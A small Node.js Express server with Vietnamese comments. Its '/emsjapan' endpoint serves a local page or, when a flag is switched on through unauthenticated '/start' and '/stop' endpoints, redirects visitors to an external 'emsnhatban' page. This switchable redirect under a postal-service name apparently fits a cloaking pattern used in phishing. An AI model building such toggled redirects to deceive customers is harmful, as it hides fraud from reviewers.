const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000; // Render sẽ tự cấp phát cổng

let isToaimeRunning = false; // Trạng thái mặc định là OFF (chuyển hướng tắt)

// Phục vụ file tĩnh từ thư mục 'public'
app.use(express.static(path.join(__dirname, 'public')));

// API kiểm tra trạng thái chuyển hướng
app.get('/status', (req, res) => {
  res.json({ redirectEnabled: isToaimeRunning });
});

// API bật chuyển hướng
app.get('/start', (req, res) => {
  isToaimeRunning = true;
  res.json({ message: 'Chuyển hướng đã được bật', redirectEnabled: true });
});

// API tắt chuyển hướng
app.get('/stop', (req, res) => {
  isToaimeRunning = false;
  res.json({ message: 'Chuyển hướng đã được tắt', redirectEnabled: false });
});

// Endpoint chính khách hàng truy cập
app.get('/emsjapan', (req, res) => {
  if (isToaimeRunning) {
    // Chuyển hướng đến emsnhatban nếu chuyển hướng đang bật
    res.redirect('https://www.nydravn.site/emsnhatban');
  } else {
    // Trả về trang chính
    res.sendFile(path.join(__dirname, 'public/index.html'));
  }
});

// Chạy server
app.listen(PORT, () => {
  console.log(`Server đang chạy trên cổng ${PORT}`);
});
